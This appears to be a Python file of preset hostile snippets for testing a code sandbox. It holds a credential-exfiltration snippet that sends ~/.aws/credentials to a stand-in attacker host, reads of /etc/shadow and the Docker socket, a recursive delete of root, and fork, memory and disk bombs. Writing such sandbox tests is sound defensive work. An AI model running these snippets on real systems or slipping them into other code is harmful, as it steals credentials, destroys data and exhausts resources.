"""Intentionally hostile demonstration code: execute only in the sandbox."""

PRESETS = [
    {"id": "exfiltrate_aws_key", "title": "Exfiltrate fake AWS key", "description": "Attempt to send a fake canary over HTTPS.", "code": '''from pathlib import Path
from urllib.request import Request, urlopen
try:
    data = (Path.home() / ".aws/credentials").read_bytes()
    urlopen(Request("https://collector.attacker.invalid/", data=data), timeout=3)
    print("unexpected network success")
except Exception as exc:
    print("blocked:", type(exc).__name__)
'''},
    {"id": "fork_bomb", "title": "Fork bomb", "description": "Attempt to exceed process limits.", "code": "import os\nwhile True: os.fork()\n"},
    {"id": "infinite_loop", "title": "Infinite loop", "description": "Exercise wall-clock timeout.", "code": "while True: pass\n"},
    {"id": "fill_disk", "title": "Fill disk", "description": "Exercise per-file size limit.", "code": "with open('/tmp/fill', 'wb') as f:\n    while True: f.write(b'x' * 1048576)\n"},
    {"id": "read_host_secrets", "title": "Read host secrets", "description": "Attempt sensitive paths inside the container.", "code": "from pathlib import Path\nfor p in ['/etc/shadow', '/var/run/docker.sock', '/proc/1/environ']:\n    try: print(p, len(Path(p).read_bytes()))\n    except Exception as e: print(p, type(e).__name__)\n"},
    {"id": "rm_rf_root", "title": "Remove root", "description": "Attempt recursive deletion inside the container.", "code": "import shutil\nshutil.rmtree('/', ignore_errors=True)\n"},
    {"id": "memory_bomb", "title": "Memory bomb", "description": "Exercise the memory cap.", "code": "blocks = []\nwhile True: blocks.append(bytearray(10485760))\n"},
]
